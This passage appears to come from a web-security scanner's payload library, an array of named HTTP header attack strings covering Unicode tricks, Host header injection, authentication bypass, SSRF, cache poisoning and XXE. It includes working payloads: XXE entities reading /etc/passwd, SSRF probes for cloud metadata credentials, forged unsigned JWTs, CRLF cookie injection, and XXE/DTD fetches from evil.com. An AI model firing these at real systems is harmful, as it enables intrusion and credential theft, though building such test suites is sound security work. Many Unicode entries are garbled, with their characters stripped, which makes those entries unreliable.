    { name: "Multiple Combining Stack",  description: "Letter + three combining marks",                                  payload: "X-Test: a\u0301\u0327\u0308",       severity: "medium" },
    { name: "Zero-Width Space",          description: "ZWSP U+200B sneaks in silently",                                  payload: "X-Test: user\u200Bname",            severity: "high" },
    { name: "Zero-Width NBSP",           description: "U+FEFF BOM in middle",                                            payload: "X-Test: FEFF\uFEFFBOM",             severity: "high" },
    { name: "Zero-Width Joiner",         description: "ZWJ U+200D to glue tokens",                                       payload: "X-Test: join\u200Dme",              severity: "medium" },

    /*   Bidirectional & Direction-Override controls   */
    { name: "RTL Mark",                  description: "Right-to-Left Mark U+200F",                                       payload: "X-Test:\u200Fadmin",                severity: "high" },
    { name: "RTL Override Injection",    description: "RLO U+202E to mask .exe",                                         payload: "file\u202Ecod.exe",                 severity: "critical" },
    { name: "LTR Mark",                  description: "LTR Mark U+200E",                                                 payload: "X-Test:\u200Evisible",              severity: "high" },
    { name: "Pop Directional Format",    description: "PDF U+202C ends override",                                       payload: "abc\u202Ertf\u202C.txt",           severity: "critical" },
    { name: "Bidi Isolate",              description: "First-Strong Isolate U+2068  PDI U+2069",                        payload: "\u2068alert(1)\u2069",              severity: "medium" },
    { name: "RLO + CRLF Split",          description: "Combine RLO with CRLF to smuggle header",                         payload: "X: \u202E\r\nSet-Cookie: admin=1",  severity: "critical" },

    /*   Emoji & Supplementary Plane payloads (4-byte)   */
    { name: "Basic Emoji",               description: "Grinning Face  (U+1F600)",                                      payload: "X-Emoji: \uD83D\uDE00",             severity: "low" },
    { name: "Emoji ZWJ Family",          description: "Family  sequence",                                        payload: "X-Family: ",              severity: "medium" },
    { name: "Flag Sequence",             description: "Country flag  (RI2)",                                         payload: "X-Flag: ",                       severity: "medium" },
    { name: "Skin-Tone Modifier",        description: " thumbs-up type III",                                         payload: "X-Thumb: ",                    severity: "medium" },
    { name: "Keycap Emoji",              description: "Number keycap 1",                                               payload: "X-Key: 1",                       severity: "low" },
    { name: "Rocket + Fire ZWJ",         description: " complex ZWJ",                                                payload: "X-Launch: ",                  severity: "medium" },

    /*   Fullwidth / Halfwidth & Confusables   */
    { name: "Fullwidth Slash",           description: " (U+FF0F) bypass path filter",                                   payload: "/apidelete",                     severity: "high" },
    { name: "Fullwidth Space",           description: "IDEOGRAPHIC SPACE U+3000",                                        payload: "X:foo\u3000bar",                   severity: "high" },
    { name: "Halfwidth Kana",            description: "Half-width ",                                                payload: "X-Kana: ",                     severity: "low" },
    { name: "Homoglyph Cyrillic ",      description: "Cyrillic small a (U+0430) vs Latin a",                            payload: "p\u0430ss",                        severity: "high" },
    { name: "Greek Kappa ",             description: "Greek  vs Latin k",                                              payload: "stacoverflow",                    severity: "medium" },
    { name: "Mathematical Bold A",       description: " (U+1D538) confusing with ASCII A",                              payload: "X-Math: ",                        severity: "medium" },

    /*   Private-Use, Non-Characters, Variation Selectors   */
    { name: "Private-Use Char",          description: "PUA U+E000",                                                      payload: "X-Test: \uE000",                   severity: "medium" },
    { name: "Non-Character FDD0",        description: "U+FDD0 non-character",                                            payload: "X-Test: \uFDD0",                   severity: "high" },
    { name: "U+FFFF Non-Character",      description: "Highest BMP non-character",                                       payload: "X-Test: \uFFFF",                   severity: "high" },
    { name: "Variation Selector-16",     description: "U+FE0F to force emoji style",                                     payload: "heart\uFE0F",                      severity: "medium" },
    { name: "Tag Latin Script",          description: "LANG TAG seq U+E0065 (e)",                                        payload: "\uE0065tag",                       severity: "medium" },

    /*   Control Pictures & Symbols   */
    { name: "Control Picture ETX",       description: " (U+2403) visible control",                                      payload: "X-Test: ",                        severity: "low" },
    { name: "Object Replacement",        description: "U+FFFC object replacement char",                                  payload: "OBJ\uFFFCECT",                     severity: "medium" },
    { name: "Replacement Char",          description: " (U+FFFD) typical decode error",                                 payload: "badseq",                          severity: "medium" },

    /*   Multilingual / Script-specific   */
    { name: "Hebrew Letter Alef",        description: " (U+05D0) RTLO context",                                          payload: "X: \u05D0",                        severity: "low" },
    { name: "Thai SARA AM",              description: " (U+0E33) with combining",                                        payload: "X-Thai: \u0E33",                  severity: "low" },
    { name: "Tibetan Tsheg",             description: " (U+0F0D) punctuation",                                           payload: "X-Test: ",                        severity: "low" },
    { name: "Sinhala Sign",              description: " (U+0DF4) end-of-text",                                         payload: "X-Test: ",                        severity: "low" },
    { name: "Khmer Vowel",               description: " (U+17B0) complex vowel",                                        payload: "X-Khmer: ",                       severity: "low" },
    { name: "Myanmar Letter",            description: " (U+1024) in header",                                            payload: "X: ",                             severity: "low" },
    { name: "Pashto Yeh",                description: " (U+06D0)",                                                      payload: "X: \u06D0",                       severity: "low" },
    { name: "Georgian Letter Ani",       description: " (U+10D0)",                                                      payload: "X: \u10D0",                       severity: "low" },
    { name: "Oriya Letter",              description: " (U+0B05)",                                                      payload: "X: \u0B05",                       severity: "low" },
    { name: "Lao Letter",                description: " (U+0EAB)",                                                      payload: "X: \u0EAB",                       severity: "low" },

    /*   Direction-Sensitive Separator payloads   */
    { name: "Line Separator U+2028",     description: "Unicode LS to split header",                                       payload: "X:good\u2028Bad:evil",             severity: "critical" },
    { name: "Paragraph Separator U+2029",description: "PS U+2029 header injection",                                       payload: "X: ok\u2029Set-Cookie: pwn",       severity: "critical" },

    /*   Unicode Normalization Edge-Cases   */
    { name: "NFC vs NFD",                description: "Same glyph different forms",                                       payload: " (NFC) vs e\u0301 (NFD)",         severity: "medium" },
    { name: "NFKD Compatibility",        description: " ligature decomposed",                                            payload: "  ff",                           severity: "medium" },

    /*   Invalid & Over-Long UTF-8 Sequences   */
    { name: "Overlong Slash",            description: "Encode '/' as C0 AF",                                              payload: "%C0%AFetc/passwd",                 severity: "critical" },
    { name: "Overlong Null",             description: "C0 80 for NUL",                                                    payload: "X:%C0%80hidden",                   severity: "critical" },
    { name: "Invalid Cont Byte",         description: "0xC2 0x41 (missing cont)",                                        payload: "%C2A",                             severity: "critical" },
    { name: "Lone 0x80",                 description: "Single continuation byte",                                         payload: "%80",                              severity: "critical" },
    { name: "Truncated 3-Byte",          description: "E2 82 (missing cont)",                                             payload: "%E2%82",                           severity: "critical" },
    { name: "CESU-8 Surrogate",          description: "ED A0 80 ED B0 80 for U+10000",                                    payload: "%EDA080%EDB080",                   severity: "high" },
    { name: "Unpaired High Surrogate",   description: "D800 in UTF-16 stream",                                            payload: "\uD800",                           severity: "high" },
    { name: "Unpaired Low Surrogate",    description: "DC00 alone",                                                       payload: "\uDC00",                           severity: "high" },
    { name: "Invalid 5-Byte 0xF8 Seq",   description: "F8 88 80 80 80 over-long",                                         payload: "%F8%88%80%80%80",                  severity: "critical" },

    /*   Mixed / Double Encodings   */
    { name: "Percent-Double UTF-8",      description: "Literal %25C3 etc",                                                payload: "%25C3%25A9",                       severity: "high" },
    { name: "Mixed Raw + Encoded ",     description: "Raw  + %C2%A9",                                                   payload: "%C2%A9",                          severity: "high" },

    /*   Alternative Encodings & Obscure Forms   */
    { name: "UTF-7 Sequence",            description: "+ADw-script+AD4-",                                                 payload: "+ADw-SCRIPT+AD4-alert(1)",         severity: "critical" },
    { name: "SCSU Escape",               description: "SCSU 0x0E 0xFE 0xFF (switch)",                                     payload: "\u00FE\u00FF",                     severity: "medium" },
    { name: "BOCU-1 Hello",              description: "BOCU-1 encoded 'hello'",                                           payload: "<BOCU1 bytes>",                    severity: "medium" },
    { name: "UTF-32 BE Injection",       description: "00 00 20 AC Euro in UTF-32-BE",                                    payload: "\\x00\\x00\\x20\\xAC",             severity: "high" },

    /*   Punycode / IDNA   */
    { name: "Punycode Homograph",        description: "xn--pple-43d.com  ple.com",                                      payload: "xn--pple-43d.com",                 severity: "high" },

    /*   Grapheme Cluster & ZWJ Edge-Cases   */
    { name: "ZWJ Flag Wales",            description: "UNICODE FLAG WALES sequence",                                    payload: "\u200D",                       severity: "medium" },
    { name: "Combining Overline",        description: "x\u0305y overlined x",                                             payload: "x\u0305y",                         severity: "medium" },
    { name: "Grapheme Joiner U+034F",    description: "CGJ inside identifier",                                            payload: "id\u034Fname",                     severity: "medium" },
    { name: "Interlinear Annotation",    description: "U+FFF9..U+FFFB trio",                                              payload: "\uFFF9Note\uFFFAtext\uFFFB",       severity: "low" },

    /*   Script-Specific Joiners / Extenders   */
    { name: "Arabic Tatweel",            description: " (U+0640) stretch injection",                                  payload: "admin",                   severity: "medium" },
    { name: "Arabic ZW Non-Joiner",      description: "U+200C in Persian forms",                                          payload: "\u200C",                      severity: "high" },

    /*   Misc Symbols & Arrows   */
    { name: "Leftwards Arrow ",         description: " U+2190 confusable for hyphen",                                   payload: "1020",                            severity: "low" },
    { name: "Heavy Check ",             description: " mark inside header",                                             payload: "X-Check: ",                       severity: "low" },

    /*   Multi-Byte Stress & Mix   */
    { name: "High-Mix Burst",            description: "Random mix NBSP, , , , , , ",                                payload: "\u00A0\u00A9\u00DF\u00B5\u00D8\u00F7\u00FF", severity: "medium" },
    { name: "Latin-1 Full Range",        description: "Every byte A0-FF (alias of earlier but for stress)",               payload: "[A0-FF sequence]",                 severity: "medium" },

    /*   Non-Unicode > U+10FFFF (Illegal)   */
    { name: "Out-of-Range Codepoint",    description: "Encode 0x11FFFF (beyond Unicode limit)",                           payload: "\\xF4\\x90\\x80\\x80",             severity: "critical" },

    /*   Multi-Lingual Greeting Confusable   */
    { name: "Mixed-Script Greeting",     description: "Hello (Latin) +  (Kana) +  (Han)",                    payload: "Hello  ",            severity: "low" }
    /* 100 tests total */
  ]
},

















    "Host Header Attacks": {
        icon: "fa-server",
        tests: [
            {
                name: "Host Header Injection",
                description: "Basic host header injection",
                payload: "Host: evil.com",
                severity: "high"
            },
            {
                name: "Duplicate Host",
                description: "Multiple host headers",
                payload: "Host: target.com\\r\\nHost: evil.com",
                severity: "high"
            },
            {
                name: "X-Forwarded-Host",
                description: "Forwarded host injection",
                payload: "X-Forwarded-Host: evil.com",
                severity: "high"
            },
            {
                name: "Absolute URL",
                description: "Host with @ bypass",
                payload: "Host: evil.com@target.com",
                severity: "medium"
            },
            {
                name: "Port Injection",
                description: "Host with port manipulation",
                payload: "Host: target.com:evil.com",
                severity: "medium"
            },
            {
                name: "X-Original-URL",
                description: "URL override header",
                payload: "X-Original-URL: /admin",
                severity: "medium"
            },
            {
                name: "X-Rewrite-URL",
                description: "URL rewrite header",
                payload: "X-Rewrite-URL: /admin",
                severity: "medium"
            },
            {
                name: "X-Forwarded-For",
                description: "Client IP spoofing",
                payload: "X-Forwarded-For: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Real-IP",
                description: "Real IP spoofing",
                payload: "X-Real-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Originating-IP",
                description: "Originating IP spoofing",
                payload: "X-Originating-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Client-IP",
                description: "Client IP header spoofing",
                payload: "X-Client-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Remote-IP",
                description: "Remote IP spoofing",
                payload: "X-Remote-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Remote-Addr",
                description: "Remote address spoofing",
                payload: "X-Remote-Addr: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "True-Client-IP",
                description: "Cloudflare True-Client-IP",
                payload: "True-Client-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "CF-Connecting-IP",
                description: "Cloudflare connecting IP",
                payload: "CF-Connecting-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "X-Forwarded-Proto",
                description: "Protocol override",
                payload: "X-Forwarded-Proto: https",
                severity: "medium"
            },
            {
                name: "X-Forwarded-Port",
                description: "Port override",
                payload: "X-Forwarded-Port: 443",
                severity: "medium"
            },
            {
                name: "X-Forwarded-Scheme",
                description: "Scheme override",
                payload: "X-Forwarded-Scheme: https",
                severity: "medium"
            },
            {
                name: "X-Forwarded-Server",
                description: "Server name override",
                payload: "X-Forwarded-Server: evil.com",
                severity: "medium"
            },
            {
                name: "X-Host",
                description: "Alternative host header",
                payload: "X-Host: evil.com",
                severity: "medium"
            },
            {
                name: "X-HTTP-Host-Override",
                description: "Host override header",
                payload: "X-HTTP-Host-Override: evil.com",
                severity: "medium"
            },
            {
                name: "Forwarded Header",
                description: "RFC 7239 Forwarded header",
                payload: "Forwarded: host=evil.com",
                severity: "medium"
            },
            {
                name: "X-Custom-IP-Authorization",
                description: "Custom IP auth header",
                payload: "X-Custom-IP-Authorization: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "Client-IP",
                description: "Client-IP header",
                payload: "Client-IP: 127.0.0.1",
                severity: "medium"
            },
            {
                name: "Contact Header",
                description: "Contact email injection",
                payload: "Contact: admin@evil.com",
                severity: "low"
            },
            {
                name: "X-Wap-Profile",
                description: "WAP profile URL",
                payload: "X-Wap-Profile: http://evil.com/profile",
                severity: "medium"
            },
            {
                name: "From Header",
                description: "From email injection",
                payload: "From: admin@evil.com",
                severity: "low"
            },
            {
                name: "Profile Header",
                description: "Profile URL injection",
                payload: "Profile: http://evil.com/profile",
                severity: "medium"
            },
            {
                name: "X-Arbitrary-Header",
                description: "Arbitrary header injection",
                payload: "X-Arbitrary: ../../admin",
                severity: "medium"
            },
            {
                name: "Base URL Override",
                description: "Base URL manipulation",
                payload: "X-Original-Base-URL: http://evil.com",
                severity: "medium"
            }
        ]
    },
    "Authentication Bypass": {
        icon: "fa-user-shield",
        tests: [
            {
                name: "JWT None Algorithm",
                description: "JWT with none algorithm",
                payload: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
                severity: "critical"
            },
            {
                name: "Basic Auth Null",
                description: "Null byte in Basic auth",
                payload: "Authorization: Basic \\x00YWRtaW46cGFzc3dvcmQ=",
                severity: "high"
            },
            {
                name: "API Key Override",
                description: "Multiple API keys",
                payload: "X-API-Key: user_key\\r\\nX-API-Key: admin_key",
                severity: "high"
            },
            {
                name: "Session Fixation",
                description: "Fixed session ID",
                payload: "Cookie: PHPSESSID=admin_fixed_session_123",
                severity: "high"
            },
            {
                name: "Bearer Injection",
                description: "Multiple bearer tokens",
                payload: "Authorization: Bearer user_token\\r\\nAuthorization: Bearer admin_token",
                severity: "high"
            },
            {
                name: "X-Auth-Token",
                description: "Alternative auth header",
                payload: "X-Auth-Token: admin",
                severity: "medium"
            },
            {
                name: "Cookie Injection",
                description: "Admin cookie injection",
                payload: "Cookie: user=admin; role=administrator",
                severity: "high"
            },
            {
                name: "JWT Algorithm Confusion",
                description: "RS256 to HS256",
                payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.signature",
                severity: "critical"
            },
            {
                name: "JWT Weak Secret",
                description: "Common JWT secret",
                payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.C2D6TlEVnLjkRBrCNmW8oDAVpKYhOJhvC6DKJZ1RqBc",
                severity: "critical"
            },
            {
                name: "JWT Kid Injection",
                description: "Key ID manipulation",
                payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiJhZG1pbiJ9.signature",
                severity: "high"
            },
            {
                name: "JWT JKU Injection",
                description: "JWK Set URL manipulation",
                payload: "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzLmpzb24ifQ.eyJzdWIiOiJhZG1pbiJ9.signature",
                severity: "high"
            },
            {
                name: "JWT X5U Injection",
                description: "X.509 URL manipulation",
                payload: "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0In0.eyJzdWIiOiJhZG1pbiJ9.signature",
                severity: "high"
            },
            {
                name: "SAML Response Injection",
                description: "SAML assertion manipulation",
                payload: "SAMLResponse: PHNhbWw6QXNzZXJ0aW9uPi4uLjwvc2FtbDpBc3NlcnRpb24+",
                severity: "critical"
            },
            {
                name: "OAuth State Parameter",
                description: "OAuth state manipulation",
                payload: "X-OAuth-State: admin_bypass",
                severity: "high"
            },
            {
                name: "LDAP Injection Auth",
                description: "LDAP authentication bypass",
                payload: "X-Username: admin)(&",
                severity: "high"
            },
            {
                name: "Kerberos Ticket",
                description: "Kerberos ticket injection",
                payload: "X-Krb-Ticket: fake_admin_ticket",
                severity: "high"
            },
            {
                name: "NTLM Hash",
                description: "NTLM hash injection",
                payload: "Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=",
                severity: "high"
            },
            {
                name: "Digest Auth Bypass",
                description: "Digest authentication bypass",
                payload: "Authorization: Digest username=\"admin\", realm=\"\", nonce=\"\"",
                severity: "high"
            },
            {
                name: "OAuth Bearer Bypass",
                description: "OAuth bearer token bypass",
                payload: "Authorization: Bearer undefined",
                severity: "medium"
            },
            {
                name: "API Version Downgrade",
                description: "API version manipulation",
                payload: "X-API-Version: 0.1",
                severity: "medium"
            },
            {
                name: "User Agent Auth",
                description: "User agent based auth",
                payload: "User-Agent: InternalBot/1.0 (Admin Access)",
                severity: "medium"
            },
            {
                name: "Referer Auth Bypass",
                description: "Referer based authentication",
                payload: "Referer: http://localhost/admin",
                severity: "medium"
            },
            {
                name: "Origin Auth Bypass",
                description: "Origin based authentication",
                payload: "Origin: http://internal.local",
                severity: "medium"
            },
            {
                name: "Custom Auth Header",
                description: "Custom authentication header",
                payload: "X-Internal-Auth: true",
                severity: "medium"
            },
            {
                name: "Debug Mode Auth",
                description: "Debug mode authentication",
                payload: "X-Debug-Mode: true\\r\\nX-Debug-User: admin",
                severity: "high"
            },
            {
                name: "Test Mode Auth",
                description: "Test mode authentication",
                payload: "X-Test-Mode: true\\r\\nX-Test-User: admin",
                severity: "high"
            },
            {
                name: "Development Auth",
                description: "Development environment auth",
                payload: "X-Dev-Mode: true\\r\\nX-Dev-Override: admin",
                severity: "high"
            },
            {
                name: "Bypass WAF Auth",
                description: "WAF bypass authentication",
                payload: "X-Originating-IP: 127.0.0.1\\r\\nX-Internal-Request: true",
                severity: "high"
            },
            {
                name: "Legacy Auth Format",
                description: "Legacy authentication format",
                payload: "X-Legacy-Auth: admin:true",
                severity: "medium"
            },
            {
                name: "GraphQL Auth Bypass",
                description: "GraphQL introspection auth bypass",
                payload: "X-GraphQL-Introspection: true",
                severity: "medium"
            }
        ]
    },
    "SSRF Attacks": {
        icon: "fa-network-wired",
        tests: [
            {
                name: "Referer SSRF",
                description: "SSRF via Referer header",
                payload: "Referer: http://169.254.169.254/latest/meta-data/",
                severity: "high"
            },
            {
                name: "Origin SSRF",
                description: "SSRF via Origin header",
                payload: "Origin: http://localhost:8080/admin",
                severity: "high"
            },
            {
                name: "X-Forwarded-For SSRF",
                description: "Internal IP via forwarded",
                payload: "X-Forwarded-For: 169.254.169.254",
                severity: "high"
            },
            {
                name: "Webhook URL",
                description: "Webhook callback SSRF",
                payload: "X-Webhook-URL: http://169.254.169.254/",
                severity: "high"
            },
            {
                name: "X-Original-URL SSRF",
                description: "URL override for SSRF",
                payload: "X-Original-URL: http://internal.local/admin",
                severity: "high"
            },
            {
                name: "X-Forwarded-Proto",
                description: "Protocol confusion",
                payload: "X-Forwarded-Proto: gopher",
                severity: "medium"
            },
            {
                name: "Proxy Header SSRF",
                description: "Proxy configuration SSRF",
                payload: "X-Proxy-URL: http://169.254.169.254:80",
                severity: "high"
            },
            {
                name: "Callback URL",
                description: "Callback parameter SSRF",
                payload: "X-Callback-URL: http://internal:8080/admin",
                severity: "high"
            },
            {
                name: "Notification URL",
                description: "Notification endpoint SSRF",
                payload: "X-Notification-URL: http://metadata.google.internal",
                severity: "high"
            },
            {
                name: "Image URL SSRF",
                description: "Image processing SSRF",
                payload: "X-Image-URL: http://169.254.169.254/latest/user-data",
                severity: "high"
            },
            {
                name: "Feed URL SSRF",
                description: "RSS/Atom feed SSRF",
                payload: "X-Feed-URL: http://localhost:6379/",
                severity: "high"
            },
            {
                name: "Import URL SSRF",
                description: "Data import SSRF",
                payload: "X-Import-URL: file:///etc/passwd",
                severity: "critical"
            },
            {
                name: "Export URL SSRF",
                description: "Data export SSRF",
                payload: "X-Export-URL: http://internal-db:3306/",
                severity: "high"
            },
            {
                name: "DNS Rebinding",
                description: "DNS rebinding attack",
                payload: "X-Target-Host: rebind.attacker.com",
                severity: "high"
            },
            {
                name: "IPv6 SSRF",
                description: "IPv6 localhost SSRF",
                payload: "X-Target-URL: http://[::1]:8080/admin",
                severity: "high"
            },
            {
                name: "Decimal IP SSRF",
                description: "Decimal IP encoding",
                payload: "X-Target-URL: http://2130706433/",
                severity: "high"
            },
            {
                name: "Octal IP SSRF",
                description: "Octal IP encoding",
                payload: "X-Target-URL: http://0177.0.0.1/",
                severity: "high"
            },
            {
                name: "Hex IP SSRF",
                description: "Hexadecimal IP encoding",
                payload: "X-Target-URL: http://0x7f000001/",
                severity: "high"
            },
            {
                name: "Mixed Encoding SSRF",
                description: "Mixed IP encoding formats",
                payload: "X-Target-URL: http://127.0.0.0x1/",
                severity: "high"
            },
            {
                name: "URL Shortener SSRF",
                description: "URL shortener bypass",
                payload: "X-URL: http://bit.ly/2X4SSKJ",
                severity: "medium"
            },
            {
                name: "XSPA Port Scan",
                description: "Cross Site Port Attack",
                payload: "X-Port-Scan: http://internal:22/",
                severity: "high"
            },
            {
                name: "Cloud Metadata AWS",
                description: "AWS metadata endpoint",
                payload: "X-URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                severity: "critical"
            },
            {
                name: "Cloud Metadata GCP",
                description: "GCP metadata endpoint",
                payload: "X-URL: http://metadata.google.internal/computeMetadata/v1/",
                severity: "critical"
            },
            {
                name: "Cloud Metadata Azure",
                description: "Azure metadata endpoint",
                payload: "X-URL: http://169.254.169.254/metadata/instance?api-version=2019-08-15",
                severity: "critical"
            },
            {
                name: "Cloud Metadata DO",
                description: "DigitalOcean metadata",
                payload: "X-URL: http://169.254.169.254/metadata/v1/",
                severity: "critical"
            },
            {
                name: "Redis SSRF",
                description: "Redis protocol SSRF",
                payload: "X-URL: redis://internal:6379/",
                severity: "high"
            },
            {
                name: "Memcached SSRF",
                description: "Memcached protocol SSRF",
                payload: "X-URL: memcached://internal:11211/",
                severity: "high"
            },
            {
                name: "Gopher SSRF",
                description: "Gopher protocol SSRF",
                payload: "X-URL: gopher://internal:70/",
                severity: "high"
            },
            {
                name: "Dict SSRF",
                description: "Dict protocol SSRF",
                payload: "X-URL: dict://internal:2628/",
                severity: "medium"
            },
            {
                name: "SFTP SSRF",
                description: "SFTP protocol SSRF",
                payload: "X-URL: sftp://internal:22/",
                severity: "medium"
            }
        ]
    },
    "Cache Poisoning": {
        icon: "fa-sync-alt",
        tests: [
            {
                name: "Unkeyed Header",
                description: "Cache poisoning via unkeyed header",
                payload: "X-Forwarded-Host: evil.com",
                severity: "high"
            },
            {
                name: "Cache Key Injection",
                description: "Manipulate cache key",
                payload: "X-Original-URL: /\\r\\nX-Injected: malicious",
                severity: "high"
            },
            {
                name: "Vary Header",
                description: "Cache vary manipulation",
                payload: "X-Test: value\\r\\nVary: *",
                severity: "medium"
            },
            {
                name: "Cache-Control",
                description: "Override cache directives",
                payload: "Cache-Control: public, s-maxage=31536000",
                severity: "medium"
            },
            {
                name: "Age Header",
                description: "Fake cache age",
                payload: "Age: 0\\r\\nX-Cache-Status: HIT",
                severity: "low"
            },
            {
                name: "Pragma Header",
                description: "Cache pragma directive",
                payload: "Pragma: no-cache\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "Expires Header",
                description: "Cache expiration manipulation",
                payload: "Expires: Thu, 01 Jan 2037 00:00:00 GMT",
                severity: "medium"
            },
            {
                name: "ETag Poisoning",
                description: "ETag cache poisoning",
                payload: "If-None-Match: \"poisoned-etag\"",
                severity: "medium"
            },
            {
                name: "Last-Modified",
                description: "Last-Modified poisoning",
                payload: "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT",
                severity: "medium"
            },
            {
                name: "Accept-Encoding",
                description: "Encoding-based cache poisoning",
                payload: "Accept-Encoding: gzip, deflate, br, malicious",
                severity: "medium"
            },
            {
                name: "Accept-Language",
                description: "Language-based cache poisoning",
                payload: "Accept-Language: en-US; q=0.9, evil",
                severity: "low"
            },
            {
                name: "X-Cache-Status",
                description: "Cache status manipulation",
                payload: "X-Cache-Status: HIT\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "CDN-Cache-Control",
                description: "CDN specific cache control",
                payload: "CDN-Cache-Control: public, max-age=31536000",
                severity: "high"
            },
            {
                name: "Surrogate-Control",
                description: "Surrogate cache control",
                payload: "Surrogate-Control: max-age=31536000",
                severity: "high"
            },
            {
                name: "X-Accel-Expires",
                description: "Nginx cache control",
                payload: "X-Accel-Expires: 31536000",
                severity: "medium"
            },
            {
                name: "CloudFront Headers",
                description: "AWS CloudFront poisoning",
                payload: "CloudFront-Viewer-Country: XX\\r\\nX-Amz-Cf-Id: poisoned",
                severity: "medium"
            },
            {
                name: "Akamai Headers",
                description: "Akamai cache poisoning",
                payload: "Akamai-Cache-Control: max-age=31536000",
                severity: "medium"
            },
            {
                name: "Fastly Headers",
                description: "Fastly cache poisoning",
                payload: "Fastly-Debug: 1\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "Varnish Headers",
                description: "Varnish cache poisoning",
                payload: "X-Varnish: poisoned\\r\\nX-Varnish-Cache: 1",
                severity: "medium"
            },
            {
                name: "Query String Cache",
                description: "Query parameter poisoning",
                payload: "X-Original-Query: ?poison=true&cache=forever",
                severity: "medium"
            },
            {
                name: "Fragment Cache",
                description: "Fragment identifier poisoning",
                payload: "X-Original-URL: /#poison",
                severity: "low"
            },
            {
                name: "Method Override Cache",
                description: "HTTP method cache poisoning",
                payload: "X-HTTP-Method-Override: POST\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "Protocol Cache",
                description: "Protocol-based cache poisoning",
                payload: "X-Forwarded-Proto: https\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "Port Cache",
                description: "Port-based cache poisoning",
                payload: "X-Forwarded-Port: 443\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "User-Agent Cache",
                description: "User-Agent cache poisoning",
                payload: "User-Agent: PoisonBot/1.0",
                severity: "low"
            },
            {
                name: "Cookie Cache",
                description: "Cookie-based cache poisoning",
                payload: "Cookie: session=admin; poison=true",
                severity: "medium"
            },
            {
                name: "Authorization Cache",
                description: "Auth-based cache poisoning",
                payload: "Authorization: Bearer poisoned_token",
                severity: "medium"
            },
            {
                name: "Range Cache",
                description: "Range request cache poisoning",
                payload: "Range: bytes=0-1023\\r\\nX-Poison: true",
                severity: "medium"
            },
            {
                name: "If-Range Cache",
                description: "If-Range cache poisoning",
                payload: "If-Range: \"poisoned\"",
                severity: "low"
            },
            {
                name: "Warning Header",
                description: "Warning header injection",
                payload: "Warning: 199 - \"Poisoned Cache\"",
                severity: "low"
            }
        ]
    },
    "XXE Injection": {
        icon: "fa-file-code",
        tests: [
            {
                name: "Content-Type XXE",
                description: "XXE via content type",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                severity: "critical"
            },
            {
                name: "SOAP XXE",
                description: "XXE in SOAP context",
                payload: 'SOAPAction: "test"\\r\\nContent-Type: text/xml',
                severity: "high"
            },
            {
                name: "DTD Reference",
                description: "External DTD reference",
                payload: "X-DTD-URL: http://evil.com/xxe.dtd",
                severity: "high"
            },
            {
                name: "SVG XXE",
                description: "XXE in SVG upload",
                payload: 'Content-Type: image/svg+xml\\r\\n\\r\\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
                severity: "high"
            },
            {
                name: "XLSX XXE",
                description: "XXE in Excel files",
                payload: "Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                severity: "high"
            },
            {
                name: "DOCX XXE",
                description: "XXE in Word files",
                payload: "Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                severity: "high"
            },
            {
                name: "RSS XXE",
                description: "XXE in RSS feeds",
                payload: 'Content-Type: application/rss+xml\\r\\n\\r\\n<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss>&xxe;</rss>',
                severity: "high"
            },
            {
                name: "Atom XXE",
                description: "XXE in Atom feeds",
                payload: 'Content-Type: application/atom+xml\\r\\n\\r\\n<!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feed>&xxe;</feed>',
                severity: "high"
            },
            {
                name: "SAML XXE",
                description: "XXE in SAML assertions",
                payload: 'Content-Type: application/saml+xml\\r\\n\\r\\n<!DOCTYPE saml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><saml>&xxe;</saml>',
                severity: "critical"
            },
            {
                name: "XSD XXE",
                description: "XXE in XML Schema",
                payload: "X-Schema-URL: http://evil.com/xxe.xsd",
                severity: "high"
            },
            {
                name: "XSLT XXE",
                description: "XXE in XSLT transformation",
                payload: "X-XSLT-URL: http://evil.com/xxe.xsl",
                severity: "high"
            },
            {
                name: "Parameter Entity XXE",
                description: "Parameter entity injection",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
                severity: "high"
            },
            {
                name: "Blind XXE OOB",
                description: "Out-of-band XXE",
